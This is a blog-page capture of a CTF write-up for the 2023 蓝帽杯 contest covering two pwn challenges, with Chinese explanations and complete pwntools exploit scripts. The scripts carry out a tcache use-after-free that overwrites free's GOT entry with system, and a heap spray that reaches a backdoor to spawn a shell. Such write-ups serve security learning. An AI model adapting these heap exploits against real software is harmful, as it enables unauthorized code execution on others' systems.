@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="takewaylibc2.31的uaf，可以直接覆盖tcache的next来任意地址申请堆块 思路就是通过uaf和tcache的key泄露出堆地址就可以获得我们申请的堆地址，申请到0x4040A0处的堆管理结构指针后就可以改他的值为我们可控的堆，提前把可控堆里的内容改完free的got edit功能时就可以泄露基地址和修改freegot为system from pwn import *from L">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 蓝帽杯">
+<meta property="og:url" content="https://grxer.gitee.io/2023/09/15/2023-lmb/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="takewaylibc2.31的uaf，可以直接覆盖tcache的next来任意地址申请堆块 思路就是通过uaf和tcache的key泄露出堆地址就可以获得我们申请的堆地址，申请到0x4040A0处的堆管理结构指针后就可以改他的值为我们可控的堆，提前把可控堆里的内容改完free的got edit功能时就可以泄露基地址和修改freegot为system from pwn import *from L">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/09/15/2023-lmb/image-20230916223113773.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/09/15/2023-lmb/image-20230916230005552.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/09/15/2023-lmb/image-20230916221851491.png">
+<meta property="article:published_time" content="2023-09-14T18:10:34.000Z">
+<meta property="article:modified_time" content="2023-09-16T15:26:44.002Z">
+<meta property="article:author" content="bxz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/09/15/2023-lmb/image-20230916223113773.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023 蓝帽杯</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2223/08/01/Englishlearning-August2023/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/09/15/2023-lmb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&text=2023 蓝帽杯"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&is_video=false&description=2023 蓝帽杯"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 蓝帽杯&body=Check out this article: https://grxer.gitee.io/2023/09/15/2023-lmb/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&name=2023 蓝帽杯&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/09/15/2023-lmb/&t=2023 蓝帽杯"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#takeway"><span class="toc-number">1.</span> <span class="toc-text">takeway</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heapSpary"><span class="toc-number">2.</span> <span class="toc-text">heapSpary</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2023 蓝帽杯
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-14T18:10:34.000Z" itemprop="datePublished">2023-09-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="takeway"><a href="#takeway" class="headerlink" title="takeway"></a>takeway</h2><p>libc2.31的uaf，可以直接覆盖tcache的next来任意地址申请堆块</p>
+<p>思路就是通过uaf和tcache的key泄露出堆地址就可以获得我们申请的堆地址，申请到0x4040A0处的堆管理结构指针后就可以改他的值为我们可控的堆，提前把可控堆里的内容改完free的got edit功能时就可以泄露基地址和修改freegot为system</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./takeway&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your food name: &#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a remark: &#x27;</span>)</span><br><span class="line">    io.send(remark)<span class="comment">#second 8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">    io.send(name)<span class="comment">#first 8</span></span><br><span class="line">command=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dir /home/grxer/share/libc-source/glibc-2.31/malloc</span></span><br><span class="line"><span class="string">b *0x004013E8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,command)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#edit泄露堆地址，修改tcache的next指针</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">ru(<span class="string">b&#x27;r is: &#x27;</span>)</span><br><span class="line">heap=uu64(r(<span class="number">4</span>))</span><br><span class="line">heap0=heap+ <span class="number">0x12d0</span></span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x4040A0</span>))<span class="comment">#first 8</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;c&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"><span class="comment">#heap0就变为堆管理结构,freegot变为了第一个堆对象</span></span><br><span class="line">add(<span class="number">3</span>,p64(heap0),<span class="string">b&#x27;fake&#x27;</span>)<span class="comment">#malloc 0x4040A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit泄露putsgot和修改freegot</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">ru(<span class="string">b&#x27;r is: &#x27;</span>)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">io.send(p64(system))<span class="comment">#first 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="heapSpary"><a href="#heapSpary" class="headerlink" title="heapSpary"></a>heapSpary</h2><p>Create堆里是一次申请16个堆，堆块的顺序是乱的，在往堆写数据时没有限制大小可以无限堆溢出</p>
+<p>Action是一个后门</p>
+<p><img src="/2023/09/15/2023-lmb/image-20230916223113773.png" alt="image-20230916223113773"></p>
+<p>我们需要堆+堆大小处存放的地址的前四个字节为0，后四个字节为system就可以拿到flag</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="type">void</span>*)(heap_ptr+size)------&gt;<span class="number">0</span></span><br><span class="line">                              system</span><br></pre></td></tr></table></figure>
+
+<p>泄露libc，虽然有堆溢出，但是却在输入后有\x00截断常规unsortedbin泄露就失效了，但是Create堆时flag是往堆+堆size位置写入四个字节可以覆盖掉这个&#x2F;x00</p>
+<p>比如我们申请creat大小为1，这个值只会覆盖unsorted堆的fd及bk的第一个bit，如果bk此时指向是unsortedbin就可以泄露出libc，所以可以利用创建大小为1的堆块切割unsortedbin来泄露libc</p>
+<p>有了libc就是需要布置满足后门的堆块，可以申请0x20000大小的堆来mmap内存，但是这道题mmap的位置似乎是随机的，但是随机的不多，程序一次申请16个来堆喷，基本上位置都在libc下面偏移0x24f000处得到</p>
+<p>利用mmap堆喷在libc下面布置大量的p32(0)+p32(systme)，我们把这个位置叫slide</p>
+<p>再利用creat堆溢出往堆上写大量的p32(slide)，由于creat是乱序的，当出现下面的情况时</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">heapA+<span class="number">10</span>,heapA</span><br></pre></td></tr></table></figure>
+
+<p>heapA堆溢出大量的p32(slide)就可以覆盖掉heapA+10堆块，就可以绕过Create里Which flag do you want?的赋值</p>
+<p><img src="/2023/09/15/2023-lmb/image-20230916230005552.png" alt="image-20230916230005552"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;ose : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,data,flag</span>):</span><br><span class="line">   menu(<span class="number">1</span>)</span><br><span class="line">   sla(<span class="string">b&#x27;need : &#x27;</span>,<span class="built_in">str</span>(size).encode()) </span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">       sla(<span class="string">b&#x27; data.&#x27;</span>,data)</span><br><span class="line">       sla(<span class="string">b&#x27;want?&#x27;</span>,<span class="built_in">str</span>(flag).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">2</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;index : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">  menu(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">5</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;index : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbpie(0x00017AC)#malloc</span></span><br><span class="line">creat(<span class="number">0x200</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">creat(<span class="number">0x200</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment">#切割unsortedbin，泄露libc</span></span><br><span class="line">creat(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">b()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  show(<span class="number">0</span>)</span><br><span class="line">  ru(<span class="string">b&#x27;is a&#x27;</span>)</span><br><span class="line">  r(<span class="number">3</span>)  </span><br><span class="line">  libcbase=uu32(r(<span class="number">4</span>))</span><br><span class="line">  <span class="keyword">if</span> libcbase&gt;<span class="number">0xf0000000</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="comment"># dbpie(0x00017AC)#malloc</span></span><br><span class="line">libcbase-=<span class="number">0x226756</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">delete()</span><br><span class="line">slide=libcbase+<span class="number">0x24f000</span></span><br><span class="line"><span class="comment">#堆喷布置合适后门</span></span><br><span class="line">creat(<span class="number">0x20000</span>,(p32(<span class="number">0</span>)+p32(system))*(<span class="number">0x20000</span>//<span class="number">8</span>),<span class="number">1</span>)</span><br><span class="line">creat(<span class="number">0x80</span>,p32(slide)*<span class="number">0x100</span>,<span class="number">1</span>)</span><br><span class="line">action(<span class="number">17</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/15/2023-lmb/image-20230916221851491.png" alt="image-20230916221851491"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#takeway"><span class="toc-number">1.</span> <span class="toc-text">takeway</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heapSpary"><span class="toc-number">2.</span> <span class="toc-text">heapSpary</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/09/15/2023-lmb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&text=2023 蓝帽杯"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&is_video=false&description=2023 蓝帽杯"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 蓝帽杯&body=Check out this article: https://grxer.gitee.io/2023/09/15/2023-lmb/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&title=2023 蓝帽杯"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/09/15/2023-lmb/&name=2023 蓝帽杯&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/09/15/2023-lmb/&t=2023 蓝帽杯"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
